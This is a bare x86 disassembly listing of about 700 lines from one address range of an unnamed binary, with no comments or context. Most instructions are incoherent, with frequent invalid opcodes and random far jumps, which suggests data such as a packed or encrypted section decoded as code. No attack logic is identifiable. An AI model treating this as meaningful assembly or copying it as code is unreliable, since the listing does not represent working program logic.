  41c196:	mov    cl,ah
  41c198:	jne    0x41c16d
  41c19a:	icebp  
  41c19b:	(bad)  
  41c19c:	mov    ds:0x556d1346,al
  41c1a1:	push   0xffffffa0
  41c1a3:	stos   BYTE PTR es:[edi],al
  41c1a4:	outs   dx,DWORD PTR ds:[esi]
  41c1a5:	test   DWORD PTR [eax+0x4c],edx
  41c1a8:	cmp    bh,bl
  41c1aa:	ror    DWORD PTR [ecx],0x7c
  41c1ad:	mov    esp,0x6680075d
  41c1b2:	push   edi
  41c1b3:	push   edi
  41c1b4:	and    dh,bl
  41c1b6:	sahf   
  41c1b7:	mov    dh,0x30
  41c1b9:	push   ss
  41c1ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1bb:	dec    ebx
  41c1bc:	sbb    edx,DWORD PTR [ebx]
  41c1be:	clc    
  41c1bf:	sub    eax,ebx
  41c1c1:	call   0x759e:0xd4928512
  41c1c8:	pop    esp
  41c1c9:	jge    0x41c1bf
  41c1cb:	jg     0x41c207
  41c1cd:	jg     0x41c1de
  41c1cf:	mov    al,0x95
  41c1d1:	mov    esp,0xf69f728b
  41c1d6:	jbe    0x41c1f0
  41c1d8:	sub    al,BYTE PTR [ebp+0x7d]
  41c1db:	fcom   DWORD PTR [eax+eax*2]
  41c1de:	cmp    al,0xe5
  41c1e0:	pop    esi
  41c1e1:	cwde   
  41c1e2:	fwait
  41c1e3:	and    eax,0xabbc4650
  41c1e8:	cmp    eax,0x56ecdbee
  41c1ed:	ins    DWORD PTR es:[edi],dx
  41c1ee:	mov    cl,0x39
  41c1f0:	xchg   ebp,eax
  41c1f1:	in     eax,dx
  41c1f2:	mov    bl,BYTE PTR [ecx-0xb]
  41c1f5:	cmp    edi,DWORD PTR [eax-0x2b]
  41c1f8:	mov    ecx,0x6666bda1
  41c1fd:	mov    edi,DWORD PTR [edi+0x63]
  41c200:	mov    bl,0x5a
  41c202:	sub    BYTE PTR [esi-0x5b],ch
  41c205:	std    
  41c206:	not    DWORD PTR [edx+edi*1-0x3fc005a]
  41c20d:	pop    ss
  41c20e:	push   cs
  41c20f:	push   ss
  41c210:	lods   eax,DWORD PTR ds:[esi]
  41c211:	daa    
  41c212:	clc    
  41c213:	out    dx,al
  41c214:	mov    ecx,0xac9406b2
  41c219:	fcom   QWORD PTR [ebx+0x1a848529]
  41c21f:	add    BYTE PTR [esi],ah
  41c221:	mov    ch,0x8
  41c223:	ds cmp eax,0xc570a307
  41c229:	mov    al,ds:0x800782be
  41c22e:	nop
  41c22f:	xchg   edx,eax
  41c230:	mov    eax,ds:0xd17aba9a
  41c235:	test   BYTE PTR [eax],al
  41c237:	sub    DWORD PTR [eax-0x75],ecx
  41c23a:	(bad)  
  41c23b:	retf   0xb76b
  41c23e:	cld    
  41c23f:	sub    ebp,DWORD PTR [ecx+eiz*4+0x58]
  41c243:	scas   al,BYTE PTR es:[edi]
  41c244:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c245:	pusha  
  41c246:	jmp    0x41c1cd
  41c248:	into   
  41c249:	xor    esi,esi
  41c24b:	outs   dx,DWORD PTR ds:[esi]
  41c24c:	popf   
  41c24d:	xchg   esp,eax
  41c24e:	or     DWORD PTR [edi-0x2c],edx
  41c251:	bound  ebx,QWORD PTR [ecx+eax*4-0x6b]
  41c255:	rcr    BYTE PTR [edx],1
  41c257:	mov    gs,WORD PTR [eax+0x3b78070d]
  41c25d:	sub    edi,DWORD PTR [ebx]
  41c25f:	and    al,bl
  41c261:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c262:	or     BYTE PTR [ebx],ch
  41c264:	push   es
  41c265:	mov    BYTE PTR [ebp-0x2a],al
  41c268:	dec    ebx
  41c269:	(bad)  [edi-0x31fb68b7]
  41c26f:	aaa    
  41c270:	mov    ebx,0x7df3449f
  41c275:	or     esi,esp
  41c277:	mov    esi,0xe4157289
  41c27c:	fbstp  TBYTE PTR [edx-0x539d5ac4]
  41c282:	scas   al,BYTE PTR es:[edi]
  41c283:	sbb    al,0x53
  41c285:	sub    esi,DWORD PTR [esi]
  41c287:	(bad)  
  41c28a:	or     ch,ah
  41c28c:	stos   DWORD PTR es:[edi],eax
  41c28d:	dec    esp
  41c28e:	mov    al,0x8
  41c290:	ins    DWORD PTR es:[edi],dx
  41c291:	xchg   edx,eax
  41c292:	jb     0x41c281
  41c294:	or     eax,0xccc7325d
  41c299:	das    
  41c29a:	push   edx
  41c29b:	retf   
  41c29c:	aaa    
  41c29d:	and    ebx,esi
  41c29f:	cmp    DWORD PTR [ecx],0xf446fd7c
  41c2a5:	mov    dh,BYTE PTR [esi+edx*2+0x449dd1ad]
  41c2ac:	xchg   DWORD PTR ds:0xcf14aa4d,ecx
  41c2b2:	add    eax,0x4069dcd1
  41c2b7:	pusha  
  41c2b8:	lds    ebx,FWORD PTR [eax]
  41c2ba:	push   ebx
  41c2bb:	push   ebx
  41c2bc:	dec    ecx
  41c2bd:	pop    eax
  41c2be:	imul   edi,DWORD PTR [esi],0x65f5a7e5
  41c2c4:	in     eax,dx
  41c2c5:	int3   
  41c2c6:	push   esi
  41c2c7:	jl     0x41c279
  41c2c9:	mov    DWORD PTR [edx-0x57],esp
  41c2cc:	and    esp,DWORD PTR [ecx]
  41c2ce:	or     BYTE PTR [ecx-0x230c8235],bh
  41c2d4:	inc    edx
  41c2d5:	xchg   ebp,eax
  41c2d6:	rcl    DWORD PTR [edx+0xf],1
  41c2d9:	fwait
  41c2da:	add    BYTE PTR [edi+0x5828b9a0],bh
  41c2e0:	repnz cmp DWORD PTR [ecx-0x4f1f4e12],eax
  41c2e7:	add    ebx,DWORD PTR [ebx+0x18]
  41c2ea:	add    DWORD PTR [edi],eax
  41c2ec:	jo     0x41c2c9
  41c2ee:	mov    ebp,0xc9f0a678
  41c2f3:	ins    BYTE PTR es:[edi],dx
  41c2f4:	jo     0x41c2db
  41c2f6:	dec    edx
  41c2f7:	add    ebx,DWORD PTR [eax+ebp*8-0x12]
  41c2fb:	frstor [esi]
  41c2fd:	mov    ch,0xe2
  41c2ff:	icebp  
  41c300:	sub    DWORD PTR [ecx+0x323644ef],0x746d546d
  41c30a:	mov    WORD PTR [ebx+0x29],?
  41c30d:	xchg   esp,eax
  41c30e:	(bad)  
  41c30f:	dec    esp
  41c310:	mov    ds:0x30a11a46,al
  41c315:	xchg   ebx,eax
  41c316:	and    DWORD PTR [ebx-0x2c9d1fed],ecx
  41c31c:	xchg   esi,eax
  41c31d:	out    0xbe,al
  41c31f:	dec    ebp
  41c320:	dec    eax
  41c321:	cwde   
  41c322:	cmp    eax,0x812eef53
  41c327:	mov    ebx,0x5a63bc12
  41c32c:	cmp    BYTE PTR [esi-0x17eaf646],bl
  41c332:	add    BYTE PTR [ebp-0x54],dl
  41c335:	fwait
  41c336:	push   ds
  41c337:	mov    esp,DWORD PTR [ecx]
  41c339:	mov    ds:0x77ac21b,al
  41c33e:	fs ds icebp 
  41c341:	outs   dx,BYTE PTR ds:[esi]
  41c342:	pop    esi
  41c343:	sbb    DWORD PTR [esi],eax
  41c345:	les    esp,FWORD PTR [esi+edx*1]
  41c348:	sbb    eax,0xa3ae8d14
  41c34d:	dec    esi
  41c34e:	push   edi
  41c34f:	popa   
  41c350:	fmul   QWORD PTR [edi+0x391d90ec]
  41c356:	adc    BYTE PTR [ebx+esi*4+0x26369855],cl
  41c35d:	pop    ds
  41c35e:	xor    esp,DWORD PTR [esi]
  41c360:	cmp    eax,0x81964b43
  41c365:	jnp    0x41c360
  41c367:	(bad)  
  41c368:	sbb    bl,cl
  41c36a:	fist   DWORD PTR [edi-0x43093800]
  41c370:	enter  0x6d57,0x52
  41c374:	ins    BYTE PTR es:[edi],dx
  41c375:	in     al,0x9
  41c377:	fmul   DWORD PTR ds:0xda8591da
  41c37d:	retf   0x93ef
  41c380:	fcmovu st,st(1)
  41c382:	inc    esi
  41c383:	(bad)  
  41c384:	cs mov cl,0x84
  41c387:	rcl    DWORD PTR [ebx+edx*4-0x5f41ab19],1
  41c38e:	jno    0x41c3e1
  41c390:	mov    ebp,0x6a8f1932
  41c395:	into   
  41c396:	inc    eax
  41c397:	jo     0x41c35e
  41c399:	ror    dl,0x30
  41c39c:	push   ebp
  41c39d:	call   0x11bb7697
  41c3a2:	pop    ebp
  41c3a3:	sbb    bh,dh
  41c3a5:	cdq    
  41c3a6:	js     0x41c406
  41c3a8:	ret    
  41c3a9:	stc    
  41c3aa:	jb     0x41c394
  41c3ac:	pop    eax
  41c3ad:	rsqrtps xmm5,XMMWORD PTR [esi+0x11]
  41c3b1:	ja     0x41c41e
  41c3b3:	cdq    
  41c3b4:	jecxz  0x41c3a7
  41c3b6:	cwde   
  41c3b7:	and    ecx,DWORD PTR [edx+0x2b327466]
  41c3bd:	mov    WORD PTR [ebx-0x377249a2],cs
  41c3c3:	ins    BYTE PTR es:[edi],dx
  41c3c4:	les    ebx,FWORD PTR [edi+0x250ccb62]
  41c3ca:	xchg   esi,eax
  41c3cb:	inc    edi
  41c3cc:	mov    edx,0x4eb3efe0
  41c3d1:	dec    ebx
  41c3d2:	mov    ds:0xa62127a7,al
  41c3d7:	(bad)  
  41c3d8:	push   esp
  41c3d9:	pop    ebp
  41c3da:	adc    ebp,DWORD PTR [eax-0x5155aad3]
  41c3e0:	cdq    
  41c3e1:	cmp    esp,ebp
  41c3e3:	xor    edx,DWORD PTR ds:0xbbb25e23
  41c3e9:	push   ecx
  41c3ea:	dec    eax
  41c3eb:	mov    bh,0xa4
  41c3ed:	div    edi
  41c3ef:	and    al,0xf0
  41c3f1:	push   ecx
  41c3f2:	mov    dh,0xae
  41c3f4:	sbb    al,0xca
  41c3f6:	ins    DWORD PTR es:[edi],dx
  41c3f7:	jb     0x41c38f
  41c3f9:	xor    DWORD PTR [eax],ecx
  41c3fb:	outs   dx,BYTE PTR ds:[esi]
  41c3fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3fd:	xchg   ebx,ebx
  41c3ff:	or     ah,bl
  41c401:	mov    esi,0x8a119700
  41c406:	enter  0xef09,0x30
  41c40a:	jmp    0x41c3a7
  41c40c:	sbb    BYTE PTR [ecx-0x1c],ah
  41c40f:	pop    ss
  41c410:	pop    ebp
  41c411:	cli    
  41c412:	pusha  
  41c413:	adc    BYTE PTR [edx],0x28
  41c416:	sbb    BYTE PTR [ecx],bl
  41c418:	xchg   BYTE PTR ds:[esi-0x5e18f81f],dl
  41c41f:	mov    al,0x7e
  41c421:	pop    es
  41c422:	into   
  41c423:	jne    0x41c3ec
  41c425:	mov    ebx,0x52366d6
  41c42a:	lahf   
  41c42b:	sbb    eax,0xa32eaa08
  41c430:	lea    esi,[eax]
  41c432:	loop   0x41c46d
  41c434:	test   al,0xd9
  41c436:	mov    ds:0x9dda0627,al
  41c43b:	jbe    0x41c4a1
  41c43d:	jno    0x41c4b5
  41c43f:	xchg   ebx,eax
  41c440:	das    
  41c441:	(bad)  
  41c442:	out    dx,al
  41c443:	ret    
  41c444:	(bad)  
  41c445:	push   0x974173fa
  41c44a:	icebp  
  41c44b:	inc    ebp
  41c44c:	push   cs
  41c44d:	xchg   DWORD PTR [eax+0x3c],ebx
  41c450:	mov    bl,0x86
  41c452:	inc    eax
  41c453:	cld    
  41c454:	push   eax
  41c455:	aam    0x7f
  41c457:	adc    eax,0x82963018
  41c45c:	pushf  
  41c45d:	jbe    0x41c448
  41c45f:	mov    dh,0x60
  41c461:	ins    BYTE PTR es:[edi],dx
  41c462:	push   0x940c155d
  41c467:	jo     0x41c463
  41c469:	push   ebp
  41c46a:	loope  0x41c419
  41c46c:	push   esp
  41c46d:	xchg   esi,eax
  41c46e:	and    ch,al
  41c470:	fsubrp st(1),st
  41c472:	ss rcl al,cl
  41c475:	inc    ecx
  41c476:	lock adc eax,0x745643c3
  41c47c:	sbb    al,0xa8
  41c47e:	leave  
  41c47f:	inc    esi
  41c480:	aad    0x84
  41c482:	enter  0x2336,0xe2
  41c486:	repnz mov bl,BYTE PTR [edx-0x56]
  41c48a:	mov    WORD PTR [edx+0x21],ds
  41c48d:	adc    ecx,DWORD PTR [edx+0x58d94e91]
  41c493:	neg    BYTE PTR [eax]
  41c495:	arpl   WORD PTR [esi-0x47],di
  41c498:	fldenv [edi+0x14]
  41c49b:	jns    0x41c4ec
  41c49d:	push   0x63
  41c49f:	stc    
  41c4a0:	mov    BYTE PTR [edx],ah
  41c4a2:	aaa    
  41c4a3:	xor    bh,BYTE PTR [esi+0x1106d0de]
  41c4a9:	(bad)  
  41c4aa:	idiv   dh
  41c4ac:	pop    edx
  41c4ad:	push   esi
  41c4ae:	mov    ecx,0x3e1841a8
  41c4b3:	fcomp  st(2)
  41c4b5:	mov    ah,0xbd
  41c4b7:	sub    eax,0xf66b6b94
  41c4bc:	mov    bl,0xec
  41c4be:	addr16 adc al,0x54
  41c4c1:	or     eax,0xa6b469be
  41c4c6:	inc    esp
  41c4c7:	lock in eax,dx
  41c4c9:	icebp  
  41c4ca:	cwde   
  41c4cb:	js     0x6bc977ae
  41c4d1:	rol    DWORD PTR [eax-0x5dfc9652],0x31
  41c4d8:	lds    ebx,FWORD PTR [eax]
  41c4da:	or     BYTE PTR [edi-0x5656c0c4],0x13
  41c4e1:	inc    ecx
  41c4e2:	and    ch,al
  41c4e4:	nop
  41c4e5:	mov    al,dh
  41c4e7:	jle    0x41c4a7
  41c4e9:	out    dx,eax
  41c4ea:	and    BYTE PTR [eax-0x6c],ah
  41c4ed:	xor    edx,DWORD PTR [esi]
  41c4ef:	jle    0x41c567
  41c4f1:	add    eax,0xbc154809
  41c4f6:	push   edx
  41c4f7:	aas    
  41c4f8:	xchg   BYTE PTR [edx],bl
  41c4fa:	fwait
  41c4fb:	out    dx,al
  41c4fc:	pushf  
  41c4fd:	dec    eax
  41c4fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4ff:	and    DWORD PTR [edi],ebx
  41c501:	(bad)
  41c504:	cmp    dl,BYTE PTR [ebp-0x1]
  41c507:	outs   dx,BYTE PTR ds:[esi]
  41c508:	sahf   
  41c509:	mov    ecx,0x2179ff2
  41c50e:	addr16 cmp ecx,ebx
  41c511:	mov    edi,0x6b652211
  41c516:	mov    dl,0x41
  41c518:	or     al,0x8
  41c51a:	push   edx
  41c51b:	adc    BYTE PTR ds:0xcb128414,ah
  41c521:	out    0xad,eax
  41c523:	(bad)  
  41c524:	call   0x80a0d3f6
  41c529:	jb     0x41c593
  41c52b:	jns    0x41c4d7
  41c52d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c52f:	call   0x2f96:0x17f7b832
  41c536:	or     al,0x25
  41c538:	aaa    
  41c539:	xchg   ebp,eax
  41c53a:	jmp    0xd5cb:0x4b1d093d
  41c541:	nop
  41c542:	jl     0x41c54e
  41c544:	mul    DWORD PTR [ecx]
  41c546:	loopne 0x41c5b9
  41c548:	popf   
  41c549:	cmp    DWORD PTR [edx-0x27],esi
  41c54c:	sub    al,0x1f
  41c54e:	addr16 retf 
  41c550:	jmp    DWORD PTR [ecx-0x28b24bbc]
  41c556:	mov    dh,0x55
  41c558:	imul   ebx,DWORD PTR [ecx-0x50],0xa4c3db4e
  41c55f:	mov    DWORD PTR [esi],edx
  41c561:	adc    dl,BYTE PTR [edi-0x194ea3d7]
  41c567:	or     dh,BYTE PTR [ecx-0x4cf98029]
  41c56d:	jbe    0x41c4f4
  41c56f:	stc    
  41c570:	dec    ecx
  41c571:	dec    edi
  41c572:	repz and ebx,DWORD PTR cs:[edi-0x33]
  41c577:	jg     0x41c55a
  41c579:	mov    edx,0xeebd61f
  41c57e:	daa    
  41c57f:	test   al,0x7f
  41c581:	stc    
  41c582:	aaa    
  41c583:	pop    eax
  41c584:	in     eax,0x95
  41c586:	xor    eax,DWORD PTR [ecx-0x3e97c16d]
  41c58c:	mov    cl,0xc6
  41c58e:	inc    ecx
  41c58f:	mov    edi,0xb597a02c
  41c594:	mov    bl,0x41
  41c596:	push   0x2
  41c598:	fcmovb st,st(7)
  41c59a:	mov    edx,ebx
  41c59c:	jno    0x41c570
  41c59e:	add    eax,0xca1119e6
  41c5a3:	cmp    al,0xf0
  41c5a5:	loopne 0x41c5b6
  41c5a7:	or     ecx,DWORD PTR ds:0x5caf011
  41c5ad:	(bad)  [ebp+0x38]
  41c5b0:	cli    
  41c5b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5b2:	push   0x11
  41c5b4:	unpckhps xmm0,xmm4
  41c5b7:	or     DWORD PTR [edx+0x44],edx
  41c5ba:	mov    bl,0xcb
  41c5bc:	and    ecx,edx
  41c5be:	popf   
  41c5bf:	sub    cl,BYTE PTR [esi]
  41c5c1:	out    dx,al
  41c5c2:	mov    dl,0xc8
  41c5c4:	and    BYTE PTR [ebp-0x56],ch
  41c5c7:	xchg   esi,eax
  41c5c8:	aam    0xf8
  41c5ca:	pop    eax
  41c5cb:	(bad)  
  41c5cd:	mov    bh,0x2c
  41c5cf:	sbb    al,0x3e
  41c5d1:	and    al,0x1
  41c5d3:	(bad)  
  41c5d4:	shl    BYTE PTR [esi-0x46ffe0a8],1
  41c5da:	or     bh,dl
  41c5dc:	fwait
  41c5dd:	test   DWORD PTR ds:0x356de603,ebp
  41c5e3:	jl     0x41c65a
  41c5e5:	push   esi
  41c5e6:	mov    ecx,0xc1bd569a
  41c5eb:	outs   dx,BYTE PTR ds:[esi]
  41c5ec:	mov    bl,0xae
  41c5ee:	jp     0x41c624
  41c5f0:	test   BYTE PTR [edi+0x0],bl
  41c5f3:	rol    BYTE PTR [edx-0x7d5501b8],cl
  41c5f9:	stos   DWORD PTR es:[edi],eax
  41c5fa:	shl    DWORD PTR ds:0xc22e2562,0xed
  41c601:	mov    esp,0x122ae7f9
  41c606:	jo     0x41c605
  41c608:	sbb    al,BYTE PTR [ebx]
  41c60a:	adc    DWORD PTR [ebx],esi
  41c60c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c60d:	jnp    0x41c5e1
  41c60f:	loopne 0x41c63f
  41c611:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c612:	loope  0x41c5a9
  41c614:	dec    edx
  41c615:	jp     0x41c681
  41c617:	jmp    0x6dd64a4e
  41c61c:	sub    ah,BYTE PTR [ecx+esi*1-0xe74e3e4]
  41c623:	inc    edi
  41c624:	shl    dl,cl
  41c626:	arpl   WORD PTR [edx+0x38],bp
  41c629:	jo     0x41c5fe
  41c62b:	cli    
  41c62c:	(bad)  
  41c62d:	enter  0xcbdd,0x39
  41c631:	data16 aam 0x66
  41c634:	mov    BYTE PTR [ebp-0x2ef21d32],dh
  41c63a:	fild   QWORD PTR [ebp+0x1e]
  41c63d:	pop    ebx
  41c63e:	sbb    esp,DWORD PTR [edx]
  41c640:	add    dl,bl
  41c642:	pop    ebp
  41c643:	clc    
  41c644:	adc    ah,cl
  41c646:	mov    al,0xc6
  41c648:	jmp    0x8031:0xed81c0c9
  41c64f:	dec    esi
  41c650:	(bad)  
  41c651:	jl     0x41c6ab
  41c653:	cld    
  41c654:	xchg   ecx,eax
  41c655:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c656:	je     0x41c68a
  41c658:	xchg   ebp,eax
  41c659:	pop    edi
  41c65a:	jne    0x41c6d1
  41c65c:	push   ecx
  41c65d:	sbb    DWORD PTR [ecx],ecx
  41c65f:	cmp    al,0xb5
  41c661:	cli    
  41c662:	xchg   DWORD PTR [ebx],edx
  41c664:	aas    
  41c665:	in     eax,0x85
  41c667:	push   esp
  41c668:	adc    eax,0xd3eb9fd9
  41c66d:	mov    cl,0xf1
  41c66f:	imul   BYTE PTR [esi-0x4992c58c]
  41c675:	inc    ecx
  41c676:	out    0xf1,eax
  41c678:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c679:	inc    esi
  41c67a:	leave  
  41c67b:	jne    0x41c6ef
  41c67d:	dec    eax
  41c67e:	xor    dl,BYTE PTR [ebp-0x21]
  41c681:	lods   eax,DWORD PTR ds:[esi]
  41c682:	xor    bh,ch
  41c684:	cmp    ebp,ecx
  41c686:	push   ds
  41c687:	(bad)  [ebx+0x173f3d29]
  41c68d:	mov    eax,ds:0x19b8fd9a
  41c692:	push   0x53e65c5d
  41c697:	enter  0x14c9,0x96
  41c69b:	pop    edx
  41c69c:	push   esi
  41c69d:	fs add bl,bl
  41c6a0:	icebp  
  41c6a1:	lock dec esi
  41c6a3:	inc    eax
  41c6a4:	or     al,0x16
  41c6a6:	dec    esi
  41c6a7:	jns    0x41c719
  41c6a9:	add    dh,BYTE PTR [eax-0x49]
  41c6ac:	int    0x82
  41c6ae:	in     eax,dx
  41c6af:	call   0xd16201e2
  41c6b4:	(bad)  
  41c6b5:	mov    ch,0x4
  41c6b7:	pushf  
  41c6b8:	add    al,al
  41c6ba:	or     BYTE PTR [bx+si],cl
  41c6bd:	and    bl,ah
  41c6bf:	xchg   esi,eax
  41c6c0:	push   edx
  41c6c1:	adc    al,0xa9
  41c6c3:	mov    ebx,0x1f65b0f0
  41c6c8:	cmp    al,0xd4
  41c6ca:	test   cl,bl
  41c6cc:	ja     0x41c69a
  41c6ce:	ins    BYTE PTR es:[edi],dx
  41c6cf:	dec    ecx
  41c6d0:	pop    ebp
  41c6d1:	pop    edi
  41c6d2:	iret   
  41c6d3:	shr    esi,0xad
  41c6d6:	or     BYTE PTR es:[ebp-0x136a7e21],dh
  41c6dd:	pushf  
  41c6de:	jno    0x41c70c
  41c6e0:	pushf  
  41c6e1:	dec    edx
  41c6e2:	scas   eax,DWORD PTR es:[edi]
  41c6e3:	shl    BYTE PTR [ebx+eax*2+0x11],0x95
  41c6e8:	inc    eax
  41c6e9:	into   
  41c6ea:	sub    al,0x2c
  41c6ec:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6ee:	or     BYTE PTR [edi+ecx*8],cl
  41c6f1:	out    dx,al
  41c6f2:	xchg   ebp,eax
  41c6f3:	popa   
  41c6f4:	push   ds
  41c6f5:	mov    BYTE PTR [eax+eiz*1-0x25],bh
  41c6f9:	pop    ss
  41c6fa:	fwait
  41c6fb:	dec    esp
  41c6fc:	cmp    DWORD PTR [esi],0x975ae110
  41c702:	pop    eax
  41c703:	out    dx,eax
  41c704:	lods   eax,DWORD PTR ds:[esi]
  41c705:	mov    ch,0x15
  41c707:	fs (bad) 
  41c709:	lea    edi,[edi]
  41c70b:	xchg   DWORD PTR [ebx-0x3140b716],edx
  41c711:	outs   dx,DWORD PTR ds:[esi]
  41c712:	(bad)  
  41c713:	ficom  WORD PTR [ebx-0x63]
  41c716:	in     al,dx
  41c717:	lods   al,BYTE PTR ds:[esi]
  41c718:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c719:	ror    DWORD PTR [edx+ecx*2+0x5042b349],0xe
  41c721:	cmp    BYTE PTR [eax-0x2],cl
  41c724:	test   ebp,ebx
  41c726:	lock jb 0x41c6ba
  41c729:	icebp  
  41c72a:	enter  0x874b,0x54
  41c72e:	cdq    
  41c72f:	push   eax
  41c730:	in     eax,0x9e
  41c732:	jmp    FWORD PTR [ecx-0x405eae17]
  41c738:	bound  eax,QWORD PTR [edx+0x45f34a1e]
  41c73e:	adc    ebx,DWORD PTR ds:0x99f42b31
  41c744:	clc    
  41c745:	mov    edi,0x3ca436a5
  41c74a:	push   ss
  41c74b:	das    
  41c74c:	(bad)  
  41c74d:	xlat   BYTE PTR ds:[ebx]
  41c74e:	mov    esp,0xaea16f6a
  41c753:	adc    ebx,esp
  41c755:	xchg   ebp,eax
  41c756:	(bad)  
  41c757:	cld    
  41c758:	rcr    BYTE PTR [edi+0x7b],cl
  41c75b:	fdiv   st,st(6)
  41c75d:	sbb    esi,ebp
  41c75f:	popf   
  41c760:	xchg   ecx,eax
  41c761:	jbe    0x41c7c2
  41c763:	test   DWORD PTR ds:0x7486db83,eax
  41c769:	push   ss
  41c76a:	mov    ebp,0x626a984b
  41c76f:	daa    
  41c770:	fstp   TBYTE PTR [edi-0x3f37a297]
  41c776:	jno    0x41c72a
  41c778:	je     0x41c718
  41c77a:	inc    ebx
  41c77b:	inc    eax
  41c77c:	shl    dh,0x9c
  41c77f:	mov    edi,0xaddf503
  41c784:	mov    eax,ds:0x1d5a12db
  41c789:	dec    edi
  41c78a:	xchg   DWORD PTR [esi-0x1d61ba66],esi
  41c790:	jmp    0xcf62:0xa56124a7
  41c797:	bound  ebp,QWORD PTR [edx+0x1]
  41c79a:	pop    esp
  41c79b:	mov    DWORD PTR [ebx],ebp
  41c79d:	or     eax,0xe6e13d4c
  41c7a2:	or     bl,BYTE PTR [edx+0x66]
  41c7a5:	sbb    BYTE PTR [eax],dl
  41c7a7:	mov    ds:0xbb71bfab,al
  41c7ac:	xchg   edi,eax
  41c7ad:	inc    ecx
  41c7ae:	call   FWORD PTR [ebp+eax*1+0x1dce4a3b]
  41c7b5:	rcr    BYTE PTR [ebx+0x66],0x23
  41c7b9:	sub    BYTE PTR [esp+ebx*1+0x59],al
  41c7bd:	sub    BYTE PTR [edx-0x32],0x70
  41c7c1:	pushf  
  41c7c2:	aam    0xae
  41c7c4:	pop    eax
  41c7c5:	addr16 mov ds:0x442a,al
  41c7c9:	cmp    cl,BYTE PTR [edi+0x35969f7e]
  41c7cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7d0:	jge    0x41c7f1
  41c7d2:	and    BYTE PTR [esi+eiz*4-0x757f553a],bh
  41c7d9:	hlt    
  41c7da:	inc    edi
  41c7db:	push   ds
  41c7dc:	icebp  
  41c7dd:	das    
  41c7de:	mov    edi,0x97a6df78
  41c7e3:	add    BYTE PTR [eax],al
  41c7e5:	mov    bl,0xbb
  41c7e7:	sti    
  41c7e8:	xor    al,0xda
  41c7ea:	pop    esp
  41c7eb:	push   ds
  41c7ec:	call   0x5adb6e4
  41c7f1:	xor    ebx,eax
  41c7f3:	pop    es
  41c7f4:	jno    0x41c7c8
  41c7f6:	cli    
  41c7f7:	out    dx,al
  41c7f8:	sub    esp,0x37465a33
  41c7fe:	mov    esi,0xce44817c
  41c803:	sti    
  41c804:	test   al,0x4b
  41c806:	(bad)  [edi+0x43]
  41c809:	inc    edi
  41c80a:	jmp    0xb433:0x94b87d09
  41c811:	in     al,dx
  41c812:	jmp    0x403e:0x4ba7b576
  41c819:	out    dx,eax
  41c81a:	scas   eax,DWORD PTR es:[edi]
  41c81b:	pushf  
  41c81c:	inc    ebx
  41c81d:	(bad)  
  41c81f:	out    0xa5,al
  41c821:	push   ecx
  41c822:	in     eax,0xcc
  41c824:	sbb    edi,0x50e01ded
  41c82a:	clc    
  41c82b:	xor    edi,ecx
  41c82d:	mov    DWORD PTR [eax+0xf019c46],ebp
  41c833:	push   ds
  41c834:	dec    esi
  41c835:	leavew 
  41c837:	retf   0x5606
  41c83a:	fs push ecx
  41c83c:	in     al,dx
  41c83d:	gs sahf 
  41c83f:	mov    eax,eax
  41c841:	jbe    0x41c822
  41c843:	or     al,0x25
  41c845:	jb     0x41c851
  41c847:	add    eax,0x7ecdfa66
  41c84c:	popa   
  41c84d:	lahf   
  41c84e:	xchg   ebx,eax
  41c84f:	(bad)  
  41c850:	jbe    0x41c7fb
  41c852:	xlat   BYTE PTR ds:[ebx]
  41c853:	fstp   st(1)
  41c855:	push   esi
  41c856:	in     al,dx
  41c857:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c858:	push   esi
  41c859:	ret    
  41c85a:	inc    ecx
  41c85b:	pop    ds
  41c85c:	stos   DWORD PTR es:[edi],eax
  41c85d:	xchg   DWORD PTR [edx+ebx*2-0x4b],ecx
  41c861:	aaa    
  41c862:	dec    edi
  41c863:	aaa    
  41c864:	in     al,dx
  41c865:	fstp   DWORD PTR [ecx]
  41c867:	cmp    eax,0xaceb67c7
  41c86c:	adc    eax,0x13b9eb22
  41c871:	sub    dl,BYTE PTR [esi]
  41c873:	push   0x19
  41c875:	xor    DWORD PTR [ebx+0x6d721521],esi
  41c87b:	cmp    eax,0x4da61d63
  41c880:	cmp    DWORD PTR [eax+0x4e],0xc230cec6
  41c887:	mov    ?,WORD PTR [edx+edx*8]
  41c88a:	nop
  41c88b:	fimul  WORD PTR [eax]
  41c88d:	enter  0xe70,0xe2
  41c891:	aam    0xe9
  41c893:	mov    bh,dh
  41c895:	jb     0x41c849
  41c897:	rol    BYTE PTR ds:0x524df82f,1
  41c89d:	les    edx,FWORD PTR ds:0x72cb311a
  41c8a3:	std    
  41c8a4:	cmp    eax,0xff42d8ce
  41c8a9:	(bad)  
  41c8aa:	mov    DWORD PTR [esi+0x55942ad2],ebp
  41c8b0:	or     ebp,DWORD PTR [edx]
  41c8b2:	xchg   DWORD PTR [ecx-0x17],eax
  41c8b5:	inc    eax
  41c8b6:	pop    ecx
  41c8b7:	ror    DWORD PTR [eax+0x5a],0x66
  41c8bb:	adc    DWORD PTR [edx],ecx
  41c8bd:	pop    edi
  41c8be:	call   0x90ff8c5
  41c8c3:	cmp    BYTE PTR [esp+edi*8+0x72d54430],ah
  41c8ca:	cld    
  41c8cb:	jmp    0x927d1a8f
  41c8d0:	jmp    0xe8f58f43
  41c8d5:	cmp    BYTE PTR [ebx+0x19],0xd7
  41c8d9:	sbb    al,0xa3
  41c8db:	dec    ebp
  41c8dc:	dec    BYTE PTR [esi+eiz*4]
  41c8df:	jae    0x41c958
  41c8e1:	mov    eax,0x7dfe794c
  41c8e6:	scas   al,BYTE PTR es:[edi]
  41c8e7:	add    eax,0x57aee75a
  41c8ec:	or     ch,BYTE PTR [ebp+0x4b]
  41c8ef:	mov    esi,0xa2810009
